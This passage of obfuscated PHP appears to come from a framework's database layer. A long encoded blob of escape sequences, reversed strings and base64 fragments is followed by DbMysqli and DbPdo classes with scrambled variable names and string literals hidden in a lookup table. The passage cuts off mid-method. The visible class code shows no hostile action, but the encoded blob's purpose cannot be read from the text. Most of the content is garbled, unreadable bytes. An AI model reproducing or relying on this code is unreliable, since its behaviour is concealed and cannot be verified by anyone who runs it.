P®K0¦YÉ').strrev('âó\'ª»Ò†“Ën«C™–J=ÄÆÖ'."\0".'Õ'."\r".'Šv’š¤£;+w3dïÄÒéÆ”ª')."\x95\x25\xab\x14\xe2\xbd\x97\xcb\xc9\x89\xf8\xa6\x83\x3d\xb4\x9\xe0\x2c\xc\x90\x35\xf1\xce\xaf\x54\x54\x58\x73\x4b\x89\xee\xdd\x2c\x65\x34\xf3\xe7\x9c\xe4\x44\xcc\x8d\xc9\xca\x20\x44\x97\xd7"."\335\6\146\363\334\51\274\147\337\2\164\214\75\167\340\121\126\131\223\221\26\23\30\11\213\116\144\1\257\352\2\23\6\253\114\367\4\317\220\270\13\166\247\323\64\312\100\273"."\256\217\222\4\321\345\165\366\106\54\240\102\262\251\160\3\104\107\307\63\251\142\43\300\326\155\154\224\253\271\363\376\176\372\5\54\160\21\53\205\247\225\313\377\144\301\70\236"."\x52\x55\x96\x6d\xe0\x1d\xdd\xce\x9f\x26\xad\x2\x88\x6e\x60\xab\x80\x2a\x42\x1f\xe0\x6\x1a\x38\x2a\x94\x62\xb8\x75\x40\x64\x3e\xc4\xe4\xd9\x54\xc\xe7\xc3\xc9\xa\x7d\xaf\x53\x29\xea\xdc\xec".base64_decode('272ocgV4VMlE9BR2ZStXwm11e1DUEhdG5H3tIZ1l+m/KpMB00M2bxF5JoPhYXPQG').base64_decode('Ydg9aFgrEVEvThNYkB6KjVmbuMsQyrD1GSzrjFKXzglFagTQdrLPMh3OxeH8UEY6')."\xfb\xa2\x32\xb9\x96\xa4\x55\xfc\xb\xc5\x77\x5c\xf7\x86\x92\xcf\x6f\x5e\x14\x9d\xeb\xec\xeb\x1a\x3b\xeb\x89\x12\x19\xf1\x99\x2e\x31\x96\x9e\xa8\x57\xe5\x8e\x9c\xcb\xe\x3b\x5a\x99\x13\x75\xa1"."\x8d\x86\x97\x31\x21\xe9\x28\x55\xf9\x2\x54\xe2\x55\x80\x60\xb0\xf4\xb4\x69\x11\xb9\x82\xe4\xb7\xa2\xe8\xc4\xf5\x9c\x1c\x8d\x9a\x5c\x9e\x82\xef\xa9\xf4\x2a\x4d\x60\x57\x41\xd2\x36\xc7\x50\x8f"."\70\375\262\354\170\110\362\265\216\142\222\123\175\211\360\363\117\123\70\305\250\322\226\151\144\252\224\101\312\127\43\36\75\122\75\311\24\204\10\62\22\345\24\277\134\361\220\164".base64_decode('zLpEkSkmZi6CGyA+YPAIbDkPNYv9IYuRyVXINyuq0DxMtAhPKnKOjb3ld7Nlq5ZT').base64_decode('5VMkS5rRNPcnBbMjJgkyRnWmlumfNt0/A2T3sukJ4xoAb6O9IIEBZrAY2gClRign')."\312\230\322\25\25\361\256\42\74\67\20\107\62\174\75\211\307\31\36\263\244\263\133\347\12\217\304\365\212\214\106\205\46\1\325\203\304\5\272\253\345\323\31\302\331\55\56\315"."\125\117\1\264\63\334\371\340\100\137\164\206\172\177\61\135\372\106\236\106\340\161\6\371\141\0\122\113\214\103\250\357\242\44\223\272\351\227\46\106\150\104\120\247\64\114\17\231".base64_decode('4yWRnDR5YqVWRYDrYYNRLrxuWjcZG+W65Fgdo9x0Eus84UOR66vacoTlcuC0XRGq')."\xe3\xe5\xaa\xcd\x93\x78\xa9\x61\x9d\xd9\xd7\x32\x79\x4b\x57\x7b\x57\x90\x27\x35\xf1\xed\x49\x59\x75\xe1\xb\xab\x99\x29\x52\xe9\x23\x3a\x30\x54\xc3\x5\x23\xad\x44\x63\x6d\x91\xe6\x50\xb4\x25"."\222\130\242\344\164\107\21\352\37\344\161\15\367\126\46\102\105\72\361\14\252\123\374\235\7\34\364\247\20\205\356\317\160\56\306\26\374\212\244\351\46\75\250\345\156\226\302\237"."\x6e\x55\xb4\x58\xc4\x66\x33\xf9\x8a\x3a\x58\x54\x5a\xa5\x74\x5e\xc8\x10\xa5\xc2\x25\x4b\xaf\x2c\x3f\xaa\x63\x73\x1\xa9\xc7\x52\x85\x72\x95\xde\x40\xf9\xea\x5f\x20\x8f\x71\xc8\xa5\x11\xe1\xa1"."\27\307\353\274\121\34\62\154\103\154\174\126\143\124\156\75\324\322\21\351\124\103\321\150\154\231\113\43\120\10\211\55\376\364\111\106\176\51\105\132\31\261\10\364\353\225\56\332".strrev('JÏ˜x=wŸ-+Lñ¯ J]l3K%G³Ò£@œ?’x+±+ê»\'Ë ¶#Ş°ì•ÁÀ')."\xd1\xb2\xfb\x64\xad\xfa\x29\x95\x7e\x80\xa5\x49\xde\x0\xab\x15\x88\xe3\x97\xec\xff\xc7\x5d\x35\x32\xc2\x2b\x97\x91\x61\x9a\x17\xdc\xa8\x90\xbe\xa9\xd0\x2c\x3f\x8e\xc9\xbe\x59\xf1\xb4\xd3\x77".strrev('!«³;'."\0".'iŠ|‚f¥¾IhÖÆ1|JIêTÄ‹M1´û	3ªŞÄñ*D—å>').strrev('•¯4'."\n".'ËÈ7Å|¾õÖW•ÜóÚ–ë³Ìğ‰á¦XÅÈX½qöQÏá­.'."\0".'Œ')."\134\51\6\207\142\374\235\24\121\325\233\123\245\3\50\133\21\62\44\136\100\151\124\352\351\313\153\374\345\13\145\1\63\221\26\37\40\356\302\302\205\222\343\142\235\333\145\255".strrev('Sº6ñº<¤Oß@Âld ç”Öbİø‡'."\n".'âıepK‚EhÂÌ‡õ„kt¡hmiw')."\371\174\22\255\376\177\122\221\146\46\44\65\114\167\43\225\35\262\275\107\235\40\273\360\313\120\175\346\260\373\21\105\234\342\175\13\312\365\12\224\264\151\210\45\257\374\156\225"."\xbb\x92\xaf\xe2\xfd\x15\x85\xbc\x8e\xab\x20\x50\x87\x55\xc4\xee\x9f\x18\xf\x48\xa\x4b\x9f\x9e\x44\x7f\x7a\xe1\x97\x1d\x67\xde\x4e\x50\x44\x5\x9f\x9c\xcc\x81\xaa\xb9\xcf\xc8\x67\x2c\xae\x10"."\x23\x12\x3a\x74\xc1\x98\x93\x5a\x58\x27\x44\x63\xaf\x0\x93\x27\xe5\x5a\x18\x4e\x86\x27\x5f\xaa\xbd\x16\x86\x5d\xff\xb9\xdf\xb0\x11\x4f\x3\x89\xb3\xd3\xfd\x78\xa\xbf\xd6\xb5\xc5\x66\xb0\x1d".base64_decode('1+M8STOp5XyUIsNYTcSaRuWwrARLRoEymfAsw9d7oVSAvcmX8ZEH4yiq874pI+00').base64_decode('jj/l2rm8mdLycapH5jJ4sRA3xXVDXcVoUlArlcQFlHxkor8ui0PI6062q8RuXqX3')."\324\11\1\163\322\325\25\115\204\153\254\162\61\102\245\376\256\124\113\342\363\144\5\146\172\141\47\114\333\240\70\352\147\27\275\241\203\11\223\233\144\267\246\134\4\335\52\275"."\x16\x1f\xac\xbc\x65\xc5\x1a\x72\x80\x51\x64\x5\x52\xb8\xe6\xe\xc8\x8c\x18\x14\x50\x16\x28\x2\x34\x5c\x1b\x19\x83\x12\xa2\x86\x7d\x24\x40\x30\x85\x4c\xb8\x7f\x4b\x2a\x87\x60\xf7\x7b\x45\x14"."\324\311\117\213\236\345\134\14\216\213\323\134\166\366\41\164\52\274\117\356\261\317\360\27\3\175\164\144\342\245\130\372\76\240\217\277\5\350\243\36\46\175\360\2\240\117\230\50"."\176\333\223\107\302\220\316\375\162\64\356\63\327\270\254\140\47\274\234\4\237\52\117\205\270\167\342\222\146\245\214\125\334\55\27\313\5\161\107\217\42\156\316\252\142\300\322\10"."\313\126\336\107\156\326\175\314\5\236\147\72\304\250\344\225\251\62\207\337\335\6\125\274\45\354\122\306\215\257\32\26\244\54\166\73\351\55\146\270\240\116\265\164\141\135\103\375"."\235\126\240\366\25\205\314\364\31\263\346\311\142\11\261\76\342\52\217\71\345\247\77\100\147\210\25\127\334\360\244\60\47\253\362\276\45\231\156\235\350\312\247\72\75\270\373\177"."\6\371\202\356\247\105\45\15\345\312\47\217\53\146\200\0\241\244\273\43\35\145\36\105\15\23\153\122\330\142\373\320\303\113\74\320\351\376\26\75\370\253\214\103\72\261\304\116"."\240\357\47\232\171\314\35\27\260\224\333\261\64\67\53\130\215\343\41\63\301\330\53\203\74\143\256\173\373\116\46\6\344\40\42\133\142\211\344\26\35\323\53\304\301\325\361\211"."\106\144\210\261\42\173\131\1\233\136\213\75\45\241\224\377\301\2\62\356\206\62\102\102\115\247\312\310\203\307\62\274\121\345\175\114\111\353\341\133\372\115\351\62\316\311\371\65"."\xc7\x2f\x1\xa4\x24\xf8\xd3\x9d\x18\x59\x60\xa0\x5b\x4\xc3\xe9\x1e\xab\xa7\x79\x54\x4d\xb4\xb1\xd2\xa7\x8c\x57\xa8\x92\x38\x93\x9e\xd1\x14\xce\xb9\x24\xb2\xc\xd7\x66\x66\x98\xe3\xf0\xeb\xc"."\71\311\17\204\72\175\202\361\240\73\324\265\133\45\327\305\262\155\32\151\110\336\6\225\115\113\357\45\12\21\16\221\371\300\40\140\17\23\237\243\304\76\61\324\306\155\26\65"."\111\265\312\55\127\302\263\53\75\221\153\312\141\61\353\30\237\307\230\333\125\364\165\27\137\210\342\55\236\347\223\11\126\362\276\251\314\246\210\240\2\201\345\44\323\127\27\23"."\302\337\224\163\61\45\266\367\331\110\104\232\311\116\235\121\224\157\2\70\116\1\35\22\35\166\372\65\351\264\24\7\243\10\165\226\13\42\42\11\143\11\377\303\63\135\26\302"."\xd8\xc9\x94\x67\xe7\x33\xbb\x63\xdb\xf3\x88\x2c\x75\x6a\x4b\xc3\x8c\x4c\xff\xbf\x7e\x27\xf1\xff\xd5\xf3\x88\xb3\xea\x99\xd8\xdc\xf5\x8\x73\x1b\x10\xcb\x8c\x3e\x1b\x93\x5c\x7a\x53\x91\xad\x67".base64_decode('HO5Dc2+AIv7euBTnirrM0RjzP6axqyItn5eO1ursRcXrtQj4BvjTp9UiXoM470u2')."\75\354\115\170\362\110\355\312\152\5\5\346\341\134\114\25\70\246\111\214\170\55\126\336\354\342\365\212\272\335\116\113\104\106\105\61\361\125\104\213\60\237\155\101\26\112\143\206"."\x8d\xf8\x4f\x80\xf9\x92\x2d\x61\x63\x25\xc6\xda\x4d\x6\xcc\xbe\xf2\x58\x86\x8e\x88\x5d\x3d\x60\x25\x19\x13\xb9\x92\x2a\xf0\x57\xd2\xb5\xa\xae\x44\x79\x82\x61\xd5\xb0\x21\x31\x5b\x40\x57\x8d".base64_decode('Ds9LnLSQLc+mS7heedFfWZvvfLkK1oh2y5v46+v13ufYp/krP0YNErDII46FDExs')."\104\356\137\310\305\147\225\72\24\122\23\242\314\70\173\245\372\216\345\57\240\12\31\32\16\311\343\145\73\277\313\62\11\101\347\116\345\202\27\111\55\125\172\37\174\122\240\342".base64_decode('fGHYzjXliMsSF3yGSbzis6rdHXXEtgYgFjEJraZYe+nxbbynhH9I7M2LyPrkU5uZ')."\273\111\332\342\220\344\222\310\331\362\3\44\356\232\130\377\337\275\227\26\126\53\226\66\55\133\52\306\323\253\225\305\20\46\113\34\344\74\374\120\262\343\132\13\361\300\201\367"."\141\3\302\207\123\326\332\305\141\303\35\254\234\44\135\121\42\142\73\343\176\51\205\144\222\144\346\112\24\132\220\56\331\334\167\234\334\151\172\5\246\54\33\121\51\233\324\142"."\36\352\320\57\66\11\214\10\277\23\44\233\136\37\204\244\67\270\275\265\334\157\267\113\67\242\151\2\171\341\312\113\57\161\27\47\321\31\254\32\346\204\304\21\340\111\257\366"."\372\170\126\33\22\104\222\240\305\63\231\126\155\250\112\321\14\343\106\170\52\112\341\105\11\221\45\131\31\13\345\165\175\330\373\34\163\100\266\114\166\25\254\114\25\126\310\122"."\x7d\x71\xfd\x21\x86\x89\xd3\xaa\xd\x9f\x6c\x34\x77\x75\xd9\xca\x99\x3\x95\x48\xa2\x6f\x5d\x70\x7d\x29\x89\xef\xc1\x46\x18\x42\x91\x8a\xe\x85\x33\xf1\xe2\x93\x6e\x9b\x6a\x5e\x8c\xaf\x19\x2a"."\103\114\136\374\256\124\17\47\207\105\42\214\142\360\144\201\4\101\152\276\252\240\101\2\1\75\37\225\232\223\57\101\307\255\220\250\376\21\1\225\356\51\226\214\321\105\6\73".base64_decode('6kzX5Esokg8MSsblTFd3vEtLmBABvjSxQASwNC/kzqLldU/v5QrekdEa9rDhpPsk')."\xce\xa8\x32\xb3\x32\xdd\xaa\x98\x54\xf8\x50\xf5\xfe\x7a\x7b\xc5\xe6\xd4\xcb\x2f\x8a\x46\x2a\xfa\x23\x69\x52\x24\xcd\x2a\x75\x68\x8f\xaa\x56\xa3\x59\xb8\xa6\x20\x57\x5d\x75\xc7\x99\x2\x5c\x97"."\146\341\272\25\331\254\262\44\136\221\352\71\132\331\36\147\170\225\223\7\62\207\114\225\1\173\70\163\132\164\274\371\254\132\270\362\163\0\161\336\322\104\110\121\275\27\102\266"."\xe0\xb9\xd1\xae\xd6\x8b\xaa\x85\xc7\xed\x85\x28\xed\x39\x5\xaa\xe1\x5a\x96\x53\x5\xbb\xa\xd5\x86\x4a\x3c\x2e\xf2\xaa\x28\x5a\xd0\x36\xf1\x19\x2d\x3b\xa6\xaa\x92\x2d\x6b\x6d\x54\xd7\xeb\x88"."\x57\xdd\xfa\xb6\x5b\xe1\xc2\x93\x2e\x4f\xc\x38\x38\x5\xea\xa\xa0\xd\x71\x8a\x79\x63\x40\xe8\xa0\x31\xfd\xf1\x49\x2e\xfc\x5e\x2e\xe\x14\x4d\x7e\x66\x64\x84\x7e\x20\xd6\x6d\xe\x59\xde\x89"."\xac\x68\xcd\xd\xa7\xc5\xb2\xe4\x33\xb6\xaa\x3a\xbb\xf\xf3\xf5\x95\x1c\x74\x5e\x63\x32\x7b\xc9\xe\x80\xb2\x3c\xa6\x63\xa4\x75\xb7\x63\x5a\xd9\x3f\x15\xcd\x67\x1f\xc9\x4b\xb2\x41\x8f\x58\x4e".strrev('ñËL\'f•sÒªœD~k[ã6&Ş€Jà¥ı—	€‹Ií¦ş!:è	$WU'."\n".'\\H')."\xe1\xbc\xa4\x59\x22\xbf\x4d\xa6\xe3\x88\xdb\x75\xca\xd6\x13\x62\x10\x1f\x8e\x3e\x49\x79\x4\x85\xc4\xa5\x11\xee\x14\xb9\x8d\x20\x60\x4b\xd0\xb\x9\xc2\xbd\x26\xe6\x97\x13\x3a\xcd\x25\x48\xc9"."\x15\xc1\xb7\x1c\x3c\x22\x9f\x7d\x70\xbf\xd9\x5a\xf6\xdc\xc0\x8a\x4\xc4\x9c\xa6\xcc\x11\xe6\xb2\x12\x9b\x71\x8b\xfe\xe0\x8b\x9\x69\xca\x4\x7d\x2\xe0\x27\xab\xbf\x10\x3\x79\x3b\x48\x73\x82"."\xf0\xd4\x81\x5f\xc3\x84\x22\xbc\xbf\x16\xe8\x2f\xe5\x5c\xd5\xe9\x2b\x56\x5c\x2d\xf4\xdb\x5a\x0\x29\xaa\x68\x82\xfa\x39\x27\xb2\x2e\x30\x94\x49\x24\x13\x15\x59\x5d\xa1\x44\x62\x59\x2c\xde\x42"."\xdd\xa2\x57\x64\x93\x5a\x92\x3a\x51\x45\x56\x57\x7b\xac\x73\xbc\xbc\x70\x47\x28\x12\xad\xc8\xc3\x9a\x47\x9d\xaa\x70\x29\x46\xb3\x22\x5d\xa4\x97\xe4\xfa\x6e\xbc\x5e\x44\x9a\x97\x88\x9e\x90\x8b".strrev('BüyoÜ‘ôæmŞ"M=Â‘¢Dä¾^§Õ’éqZ/.ÎæL™õ/œ!b')."\x43\x58\x6b\xa8\x13\xda\x8e\x97\x20\x15\xbb\x89\xe7\x7b\x9d\x13\xd2\xe2\xe6\x3b\xe0\xba\x21\x97\xd2\xc9\x7e\x20\x8\x46\x82\x39\xf9\xa0\x25\x9\x53\xaa\x4e\x90\x2c\xd8\xad\xbc\x68\x20\xb9\x62"."\x2\x70\xc7\x16\x9b\xa0\x72\xd6\x6f\xa6\xa4\x8b\x4\xca\xc6\x80\xd\x26\x4c\xa9\xa4\x19\x46\xc3\xae\x6c\x47\xcb\x55\xbd\x28\xa6\xd2\x3c\xbc\xe3\x85\x9c\xed\x7f\x3\x6d\x75\x7b\xa0\xd4\xab\x0"."\x0", 10, -8))); goto Bš…ÑæÍŒË; C“Ø³ˆ§ªë: class DbMysqli extends Db { public function __construct($åõ€º‘ç = '') { $·×àäé =& $_SERVER[Ã¶¡¶„æ]; if (!extension_loaded($·×àäé[926])) { think_exception(think_lang($·×àäé[14]) . $·×àäé[927]); } if (!empty($åõ€º‘ç)) { $this->config = $åõ€º‘ç; if (empty($this->config[$·×àäé[17]])) { $this->config[$·×àäé[17]] = $·×àäé[12]; } } } public function connect($ù–´›„ = '', $…³·ü¿ = 0) { $‘ªÉŒ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($this->linkID[$…³·ü¿])) { if (empty($ù–´›„)) { $ù–´›„ = $this->config; } $this->linkID[$…³·ü¿] = new mysqli($ù–´›„[$‘ªÉŒ[900]], $ù–´›„[$‘ªÉŒ[902]], $ù–´›„[$‘ªÉŒ[903]], $ù–´›„[$‘ªÉŒ[21]], $ù–´›„[$‘ªÉŒ[901]] ? intval($ù–´›„[$‘ªÉŒ[901]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $­ÒæÁ÷… = $this->linkID[$…³·ü¿]->server_version; $this->linkID[$…³·ü¿]->query($‘ªÉŒ[904] . think_config($‘ªÉŒ[905]) . $‘ªÉŒ[58]); if ($­ÒæÁ÷… > $‘ªÉŒ[906]) { $this->linkID[$…³·ü¿]->query($‘ªÉŒ[907]); } $this->connected = !0; if (1 != think_config($‘ªÉŒ[22])) { unset($this->config); } } return $this->linkID[$…³·ü¿]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¹ÑİÖ×Ï) { $µ­Úø­ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¹ÑİÖ×Ï; if ($this->queryID) { $this->free(); } think_action_status($µ­Úø­[23], 1); think_status($µ­Úø­[24]); $this->queryID = $this->_linkID->query($¹ÑİÖ×Ï); if ($this->_linkID->more_results()) { while (($·¬³ÕÑ» = $this->_linkID->next_result()) != NULL) { $·¬³ÕÑ»->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ÍÚ×Çî§) { $Ëğ¨µÏ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÍÚ×Çî§; if ($this->queryID) { $this->free(); } think_action_status($Ëğ¨µÏ[25], 1); think_status($Ëğ¨µÏ[24]); $Ä£¢É° = $this->_linkID->query($ÍÚ×Çî§); $this->debug(); if (!1 === $Ä£¢É°) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $âˆ¹é¯ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$âˆ¹é¯) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Ñİ ê“ˆ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Ñİ ê“ˆ) { $this->error(); return !1; } } return !0; } private function getAll() { $¨Ëø¹Şá = array(); if ($this->numRows > 0) { for ($ÁÁ£Î¢Ú = 0; $ÁÁ£Î¢Ú < $this->numRows; $ÁÁ£Î¢Ú++) { $¨Ëø¹Şá[$ÁÁ£Î¢Ú] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¨Ëø¹Şá; } public function getFields($Ïª•À¸) { $Š„Ÿè¸¬ =& $_SERVER[Ã¶¡¶„æ]; $Ş’á«ä³ = $this->query($Š„Ÿè¸¬[911] . $this->parseKey($Ïª•À¸)); $×ÜáÀıÎ = array(); if ($Ş’á«ä³) { foreach ($Ş’á«ä³ as $›©Ì°Îş => $‹×ù¹¦û) { $×ÜáÀıÎ[$‹×ù¹¦û[$Š„Ÿè¸¬[31]]] = array($Š„Ÿè¸¬[32] => $‹×ù¹¦û[$Š„Ÿè¸¬[31]], $Š„Ÿè¸¬[33] => $‹×ù¹¦û[$Š„Ÿè¸¬[34]], $Š„Ÿè¸¬[35] => (bool) ($‹×ù¹¦û[$Š„Ÿè¸¬[36]] === $Š„Ÿè¸¬[12]), $Š„Ÿè¸¬[37] => $‹×ù¹¦û[$Š„Ÿè¸¬[38]], $Š„Ÿè¸¬[39] => strtolower($‹×ù¹¦û[$Š„Ÿè¸¬[40]]) == $Š„Ÿè¸¬[41], $Š„Ÿè¸¬[42] => strtolower($‹×ù¹¦û[$Š„Ÿè¸¬[43]]) == $Š„Ÿè¸¬[44]); } } return $×ÜáÀıÎ; } public function getTables($µ¨§Íª´ = '') { $Ëìú¢ =& $_SERVER[Ã¶¡¶„æ]; $Ô»×€ÊÂ = !empty($µ¨§Íª´) ? $Ëìú¢[913] . $µ¨§Íª´ . $Ëìú¢[914] : $Ëìú¢[915]; $üÈã¦ùÄ = $this->query($Ô»×€ÊÂ); $¸ŒÑÇ³² = array(); if ($üÈã¦ùÄ) { foreach ($üÈã¦ùÄ as $Àò›òô => $”šğ¨ÜÜ) { $¸ŒÑÇ³²[$Àò›òô] = current($”šğ¨ÜÜ); } } return $¸ŒÑÇ³²; } public function replace($‚šÜŞ, $®ÎÏô·á = array()) { $•¢”ğ„Ã =& $_SERVER[Ã¶¡¶„æ]; foreach ($‚šÜŞ as $† üèÙ => $õ©à·°å) { $Ğç›Ÿ”€ = $this->parseValue($õ©à·°å); if (is_scalar($Ğç›Ÿ”€)) { $ú”ÀŸåº[] = $Ğç›Ÿ”€; $İ”Ü†½[] = $this->parseKey($† üèÙ); } } $ŞÁş¤Ê = $•¢”ğ„Ã[916] . $this->parseTable($®ÎÏô·á[$•¢”ğ„Ã[279]]) . $•¢”ğ„Ã[917] . implode($•¢”ğ„Ã[50], $İ”Ü†½) . $•¢”ğ„Ã[918] . implode($•¢”ğ„Ã[50], $ú”ÀŸåº) . $•¢”ğ„Ã[919]; return $this->execute($ŞÁş¤Ê); } public function insertAll($ˆü‰—€ü, $«Ç·‰ = array(), $Ô±ß¯òè = false) { $Ö“ë¯À =& $_SERVER[Ã¶¡¶„æ]; if (!is_array($ˆü‰—€ü[0])) { return !1; } $‡½îî×ë = array_keys($ˆü‰—€ü[0]); $³ê§È¾ = array(); foreach ($ˆü‰—€ü as $¡İ–Û•) { $Ù¢ÒÛ³÷ = array(); foreach ($¡İ–Û• as $èäı×ğé => $Ï‘½¾¯œ) { $Ï‘½¾¯œ = $this->parseValue($Ï‘½¾¯œ); if (is_scalar($Ï‘½¾¯œ)) { $Ù¢ÒÛ³÷[] = $Ï‘½¾¯œ; } } $³ê§È¾[] = $Ö“ë¯À[260] . implode($Ö“ë¯À[50], $Ù¢ÒÛ³÷) . $Ö“ë¯À[919]; } array_walk($‡½îî×ë, array($this, $Ö“ë¯À[920])); $öèî¡Ï = $Ô±ß¯òè ? $Ö“ë¯À[921] : $Ö“ë¯À[922]; $´ÖÇÊ²’ = $öèî¡Ï . $Ö“ë¯À[923] . $this->parseTable($«Ç·‰[$Ö“ë¯À[279]]) . $Ö“ë¯À[917] . implode($Ö“ë¯À[50], $‡½îî×ë) . $Ö“ë¯À[924] . implode($Ö“ë¯À[50], $³ê§È¾); return $this->execute($´ÖÇÊ²’); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $‰–ô„â =& $_SERVER[Ã¶¡¶„æ]; $this->error = $this->_linkID->errno . $‰–ô„â[4] . $this->_linkID->error; if ($‰–ô„â[12] != $this->queryStr) { $this->error .= LNG($‰–ô„â[48]) . $this->queryStr; } think_trace($this->error, $‰–ô„â[12], $‰–ô„â[49]); return $this->error; } public function escapeString($÷„Ûƒöí) { if ($this->_linkID) { return $this->_linkID->real_escape_string($÷„Ûƒöí); } else { return addslashes($÷„Ûƒöí); } } public function parseKey(&$Ö©åé¶, $êóœÍ© = true) { $ô’Ô÷™¢ =& $_SERVER[Ã¶¡¶„æ]; if ($êóœÍ©) { $Ö©åé¶ = $this->parseKeyCheck($Ö©åé¶); } if ($Ö©åé¶ != $ô’Ô÷™¢[188] && !preg_match($ô’Ô÷™¢[925], $Ö©åé¶)) { $Ö©åé¶ = $ô’Ô÷™¢[385] . trim($Ö©åé¶, $ô’Ô÷™¢[385]) . $ô’Ô÷™¢[385]; } return $Ö©åé¶; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Â®£îê = '') { $µµ¸æ­À =& $_SERVER[Ã¶¡¶„æ]; if (!class_exists($µµ¸æ­À[928])) { think_exception(think_lang($µµ¸æ­À[14]) . $µµ¸æ­À[929]); } if (!empty($Â®£îê)) { $this->config = $Â®£îê; if (empty($this->config[$µµ¸æ­À[17]])) { $this->config[$µµ¸æ­À[17]] = array(); } } } public function connect($Œİ©ÓéÙ = '', $Í³£áª = 0) { $ÍÏÍ¤Ø¢ =& $_SERVER[Ã¶¡¶„æ]; if (!isset($this->linkID[$Í³£áª])) { if (empty($Œİ©ÓéÙ)) { $Œİ©ÓéÙ = $this->config; } $œØ‡¨¶å = !empty($Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[17]][$ÍÏÍ¤Ø¢[18]]) ? $Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[17]][$ÍÏÍ¤Ø¢[18]] : $this->pconnect; if ($œØ‡¨¶å) { $Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Í³£áª] = new PDO($Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[930]], $Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[902]], $Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[903]], $Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[17]]); } catch (PDOException $ıæÓÙÃÔ) { think_exception($ıæÓÙÃÔ->getMessage()); } $this->dbType = $this->_getDsnType($Œİ©ÓéÙ[$ÍÏÍ¤Ø¢[930]]); if (in_array($this->dbType, array($ÍÏÍ¤Ø¢[931], $ÍÏÍ¤Ø¢[932], $ÍÏÍ¤Ø¢[933], $ÍÏÍ¤Ø¢[934]))) { think_exception($ÍÏÍ¤Ø¢[935] . $this->dbType . $ÍÏÍ¤Ø¢[936] . $this->dbType . $ÍÏÍ¤Ø¢[937]); } if (!$this->linkID[$Í³£áª]) { think_exception($ÍÏÍ¤Ø¢[938]); } try { $this->linkID[$Í³£áª]->exec($ÍÏÍ¤Ø¢[939] . think_config($ÍÏÍ¤Ø¢[905])); } catch (Exception $ıæÓÙÃÔ) { } $this->connected = !0; if (1 != think_config($ÍÏÍ¤Ø¢[22])) { unset($this->config); } } return $this->linkID[$Í³£áª]; } public function free() { $this->PDOStatement = null; } public function query($×¾åøéİ, $ Ì´´úä = array()) { $¦±å‰ì¬ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $×¾åøéİ; if (!empty($ Ì´´úä)) { $this->queryStr .= $¦±å‰ì¬[940] . print_r($ Ì´´úä, !0) . $¦±å‰ì¬[941]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¦±å‰ì¬[23], 1); think_status($¦±å‰ì¬[24]); $this->PDOStatement = $this->_linkID->prepare($×¾åøéİ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÌãŸÖÀõ = $this->PDOStatement->execute($ Ì´´úä); $this->debug(); if (!1 === $ÌãŸÖÀõ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($Ì‘Íšà³, $ş³ğÛÂ = array()) { $«íº›Ù =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Ì‘Íšà³; if (!empty($ş³ğÛÂ)) { $this->queryStr .= $«íº›Ù[940] . print_r($ş³ğÛÂ, !0) . $«íº›Ù[941]; } $ÍÜŸ„¢ = !1; if ($this->dbType == $«íº›Ù[934]) { if (preg_match($«íº›Ù[942], $this->queryStr, $ ĞÙÊ¤œ)) { $this->table = think_config($«íº›Ù[943]) . str_ireplace(think_config($«íº›Ù[944]), $«íº›Ù[378], $ ĞÙÊ¤œ[2]); $ÍÜŸ„¢ = (bool) $this->query($«íº›Ù[945] . strtoupper($this->table) . $«íº›Ù[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($«íº›Ù[25], 1); think_status($«íº›Ù[24]); $this->PDOStatement = $this->_linkID->prepare($Ì‘Íšà³); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Øæğİ Û = $this->PDOStatement->execute($ş³ğÛÂ); $this->debug(); if (!1 === $Øæğİ Û) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ÍÜŸ„¢ || preg_match($«íº›Ù[946], $Ì‘Íšà³)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Í¾™‹èÊ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Í¾™‹èÊ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ØÊı–Ÿ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ØÊı–Ÿ) { $this->error(); return !1; } } return !0; } private function getAll() { $ŠŞ‚¦»· = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ŠŞ‚¦»·); return 